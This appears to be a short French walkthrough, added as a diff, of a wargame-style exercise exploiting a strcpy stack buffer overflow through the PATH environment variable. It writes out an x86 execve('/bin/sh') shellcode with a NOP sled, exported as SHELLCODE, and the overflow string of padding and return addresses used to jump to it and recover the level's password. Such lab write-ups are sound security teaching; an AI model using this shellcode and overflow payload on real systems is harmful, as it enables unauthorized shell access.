@@ -1,0 +1,13 @@
+en regardant la structure, on s'apercoit vite qu'il est possible de creer un overflow grace au strcpy qui, encore une fois ne verifie pas la taille.
+En lancant le programme directement, il s'arrete a username qu'il ne trouve pas.
+Notre premiere etape va donc etre de set le USERNAME a une taille correcte, nous ne voulons pas faire l'overflow sur cette variable.
+Le programme se lance alors correctement.
+Maintenant nous essayons de faire crashet le programme. Il va donc falloir creer un overlfow dans la derniere variable recuperee, le PATH.
+On va exporter une variable SHELLCODE qui contient :
+export SHELLCODE=`python -c 'print "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80 "'`
+et qui nous permettra d'ouvrir un shell.
+Avec le programme de l'exercice precedent on recupere l'adresse du SHELLCODE
+On va ensuite faire des test sous gdb pour jump sur notre shell code.
+Selon l'adresse du SHELL CODE, on obtient quelque chose comme ca :
+export PATH=`/usr/bin/python -c 'print "A" * 160 + "\x62\xfb\xff\xbf" + "\x5e\xf7\xff\xbf" + "C" * 500'`
+Il ne nous reste plus qu'a lancer le programme et recuperer le mot de passe
